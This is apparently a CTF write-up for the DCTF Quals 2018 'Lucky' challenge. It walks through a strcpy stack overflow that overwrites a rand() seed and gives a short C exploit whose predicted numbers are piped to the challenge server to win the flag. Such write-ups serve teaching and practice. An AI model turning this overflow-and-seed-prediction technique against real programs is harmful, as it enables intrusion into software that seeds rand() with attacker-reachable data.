---
layout: post
title: "[DCTF Quals 2018] Lucky"
date: 2018-10-06 16:52 -0300
categories: [dctf, writeups]
tags: [ DCTF, DefCamp, '2018', writeups, CTF,  challange]
---

![Image of DCTF Quals 2018](/uploads/Screenshot%20from%202018-10-01%2016-37-21.png)

### Description:

How lucky are you?

Target: 167.99.143.206 65031

Bin: [Lucky Binary](/uploads/lucky)

### Author: 
Lucian Nitescu

### Stats: 
50 point / 139 solvers

### Solution:  

On ```167.99.143.206``` at port 65031 we can observe the following:

```terminal
$ nc 167.99.143.206 65031                                                             
Hello, there!

What is your name?
Lucian
I am glad to know you, Lucian!
If you guess the next 100 random numbers I shall give you the flag!

What number am I thinking of? [0/100]
1
Wow that is wrong!

$ 
```

Using the provided binary file we can send a long string as name and obtain a buffer overflow error (```Segmentation fault (core dumped)```):

```terminal
$ ./lucky 
Hello, there!

What is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
I am glad to know you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
If you guess the next 100 random numbers I shall give you the flag!

What number am I thinking of? [0/100]
1
Wow that is wrong!
Segmentation fault (core dumped)
```

Let’s decompile the binary in IDA and analyze its main function.

```c++
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax@1
  unsigned int *v4; // rsi@2
  __int64 v5; // rax@4
  __int64 v6; // rax@6
  __int64 v7; // rax@7
  __int64 v8; // rax@7
  __int64 v9; // rax@7
  const char *v10; // rax@7
  __int64 v11; // rax@7
  __int64 v12; // rax@7
  __int64 v13; // rax@7
  __int64 v14; // rax@7
  __int64 v15; // rax@7
  __int64 v16; // rax@9
  __int64 v17; // rax@9
  __int64 v18; // rax@9
  __int64 v19; // rax@10
  __int64 v20; // rax@10
  __int64 v21; // rax@11
  signed int v22; // ebx@11
  __int64 v23; // rax@13
  char v25; // [sp+0h] [bp-540h]@12
  char v26; // [sp+210h] [bp-330h]@12
  char v27; // [sp+240h] [bp-300h]@7
  char dest; // [sp+260h] [bp-2E0h]@7
  char v29; // [sp+2D0h] [bp-270h]@7
  char v30; // [sp+2F0h] [bp-250h]@1
  __int64 v31; // [sp+3F0h] [bp-150h]@1
  unsigned int seed[2]; // [sp+4F8h] [bp-48h]@1
  int v33; // [sp+514h] [bp-2Ch]@9
  int v34; // [sp+518h] [bp-28h]@9
  unsigned int v35; // [sp+51Ch] [bp-24h]@7
  __int64 v36; // [sp+520h] [bp-20h]@1
  unsigned int i; // [sp+52Ch] [bp-14h]@7
 
  *(_QWORD *)seed = 0LL;
  v36 = 8LL;
  v3 = sub_1972(8LL, 4LL, a3);
  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(&v30, "/dev/urandom", (unsigned int)v3);
  if ( (unsigned __int8)std::basic_ios<char,std::char_traits<char>>::operator bool(&v31) )
  {
    v4 = seed;
    std::istream::read((std::istream *)&v30, (char *)seed, v36);
    if ( (unsigned __int8)std::basic_ios<char,std::char_traits<char>>::operator bool(&v31) )
    {
      srand(seed[0]);
    }
    else
    {
      LODWORD(v5) = std::operator<<<std::char_traits<char>>(&std::cerr, "Failed to read from /dev/urandom");
      v4 = (unsigned int *)&std::endl<char,std::char_traits<char>>;
      std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
    }
    std::basic_ifstream<char,std::char_traits<char>>::close(&v30, v4);
  }
  else
  {
    LODWORD(v6) = std::operator<<<std::char_traits<char>>(&std::cerr, "Failed to open /dev/urandom");
    std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
  }
  v35 = rand();
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v29);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v27);
  LODWORD(v7) = std::operator<<<std::char_traits<char>>(&std::cout, "Hello, there!");
  LODWORD(v8) = std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
  std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
  LODWORD(v9) = std::operator<<<std::char_traits<char>>(&std::cout, "What is your name?");
  std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, &v27);
  LODWORD(v10) = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(&v27);
  strcpy(&dest, v10);
  srand(v35);
  LODWORD(v11) = std::operator<<<std::char_traits<char>>(&std::cout, "I am glad to know you, ");
  LODWORD(v12) = std::operator<<<std::char_traits<char>>(v11, &dest);
  LODWORD(v13) = std::operator<<<std::char_traits<char>>(v12, "!");
  std::ostream::operator<<(v13, &std::endl<char,std::char_traits<char>>);
  LODWORD(v14) = std::operator<<<std::char_traits<char>>(
                   &std::cout,
                   "If you guess the next 100 random numbers I shall give you the flag!");
  LODWORD(v15) = std::ostream::operator<<(v14, &std::endl<char,std::char_traits<char>>);
  std::ostream::operator<<(v15, &std::endl<char,std::char_traits<char>>);
  for ( i = 0; (signed int)i <= 99; ++i )
  {
    v34 = rand();
    LODWORD(v16) = std::operator<<<std::char_traits<char>>(&std::cout, "What number am I thinking of? [");
    LODWORD(v17) = std::ostream::operator<<(v16, i);
    LODWORD(v18) = std::operator<<<std::char_traits<char>>(v17, "/100]");
    std::ostream::operator<<(v18, &std::endl<char,std::char_traits<char>>);
    std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, &v27);
    v33 = sub_1928(&v27, 0LL, 10LL);
    if ( v33 != v34 )
    {
      LODWORD(v21) = std::operator<<<std::char_traits<char>>(&std::cout, "Wow that is wrong!");
      std::ostream::operator<<(v21, &std::endl<char,std::char_traits<char>>);
      v22 = -1;
      goto LABEL_15;
    }
    LODWORD(v19) = std::operator<<<std::char_traits<char>>(&std::cout, "Wow that is corect!");
    LODWORD(v20) = std::ostream::operator<<(v19, &std::endl<char,std::char_traits<char>>);
    std::ostream::operator<<(v20, &std::endl<char,std::char_traits<char>>);
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v26);
  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(&v25, "./flag", 8LL);
  if ( (unsigned __int8)std::basic_ifstream<char,std::char_traits<char>>::is_open(&v25) )
  {
    std::getline<char,std::char_traits<char>,std::allocator<char>>(&v25, &v26);
    LODWORD(v23) = std::operator<<<char,std::char_traits<char>,std::allocator<char>>(&std::cout, &v26);
    std::ostream::operator<<(v23, &std::endl<char,std::char_traits<char>>);
    std::basic_ifstream<char,std::char_traits<char>>::close(&v25, &std::endl<char,std::char_traits<char>>);
  }
  v22 = 0;
  std::basic_ifstream<char,std::char_traits<char>>::~basic_ifstream(&v25);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v26);
LABEL_15:
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v27);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v29);
  std::basic_ifstream<char,std::char_traits<char>>::~basic_ifstream(&v30);
  return (unsigned int)v22;
}
```


After observing the decompiled binary we can observe the buffer overflow occures after 700 bytes and overwrites the seed value (```srand()```) of the random function (```rand()```). Using the following simple script an attacker can deduct all the random values:

```c++
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
	unsigned int i = 0;
	setvbuf(stdout, NULL, _IONBF, 0);

	puts("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxAAAA");

	srand(0x41414141);

	for (i = 0 ; i < 100 ; ++i) {
		printf("%d\n", rand());
	}

	return 0;
}
```

Final step:

```terminal
$ ./a.out | nc 167.99.143.206 65031
Hello, there!

What is your name?
I am glad to know you, xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxAAAA!
If you guess the next 100 random numbers I shall give you the flag!

What number am I thinking of? [0/100]
Wow that is corect!

What number am I thinking of? [1/100]
Wow that is corect!

What number am I thinking of? [2/100]
Wow that is corect!

What number am I thinking of? [3/100]
Wow that is corect!

...sniiiip....

What number am I thinking of? [95/100]
Wow that is corect!

What number am I thinking of? [96/100]
Wow that is corect!

What number am I thinking of? [97/100]
Wow that is corect!

What number am I thinking of? [98/100]
Wow that is corect!

What number am I thinking of? [99/100]
Wow that is corect!

DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}
```

The flag was DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}.